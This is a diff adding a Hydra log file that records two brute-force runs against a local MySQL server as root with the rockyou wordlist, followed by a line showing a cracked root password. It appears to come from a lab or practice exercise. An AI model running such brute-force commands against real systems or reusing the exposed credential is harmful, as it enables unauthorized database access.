@@ -1,0 +1,3 @@
+# Hydra v9.5 run at 2024-01-12 19:40:53 on loaclhost mysql (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I mysql://loaclhost)
+# Hydra v9.5 run at 2024-01-12 19:41:11 on 127.0.0.1 mysql (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I mysql://127.0.0.1)
+[3306][mysql] host: 127.0.0.1   login: root   password: Cmonster2006
